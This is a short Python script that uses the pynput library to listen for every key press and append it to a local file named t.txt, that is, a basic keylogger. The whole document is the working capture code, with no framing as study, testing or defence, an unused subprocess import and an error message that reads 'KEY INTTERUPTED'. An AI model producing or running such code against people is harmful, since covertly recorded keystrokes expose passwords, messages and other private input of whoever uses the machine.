from pynput.keyboard import Key, Listener
import subprocess



def on_press(key):
    f=open('t.txt','ab')
    f.write((str(key).encode()))
    f.close()
try:

	with Listener(on_press=on_press) as listener:
		listener.join()
except:
	print("KEY INTTERUPTED") 
